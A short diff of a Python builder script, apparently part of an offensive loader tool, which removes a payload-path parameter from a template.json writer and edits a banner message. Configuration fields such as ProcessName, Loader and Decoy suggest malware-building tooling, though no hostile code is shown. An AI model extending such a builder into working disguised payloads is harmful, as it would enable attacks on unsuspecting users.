@@ -179,10 +179,9 @@ def read_from_template(Path):
 
 
 
-def build_template(Path, Payload, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
+def build_template(Path, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
     Path = os.path.join(Path, "template.json")
     data = {
-        "Payload_Path": Payload,
         "Url": Url,
         "Encryption": Encryption,
         "Enumeration": Enumeration,
@@ -259,12 +258,12 @@ def main():
     os.makedirs(build_folder, exist_ok=True)
     Path = os.path.join(build_folder, Name)
 
-    print("""
-[+] Casting... 
+    print(f"""
+[+] Casting {Name}... 
 
     ╰( ⁰ ਊ ⁰ )━━☆ﾟ.*･｡ﾟ \n""")
 
-    if not build_template(build_folder, Payload, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
+    if not build_template(build_folder, Url, Encryption, Enumeration, ProcessName, Loader, Decoy):
         print(f"\n[+] Template saved at {build_folder}")
     else:
         print(f"\n[!] Failed to save template at {build_folder}")
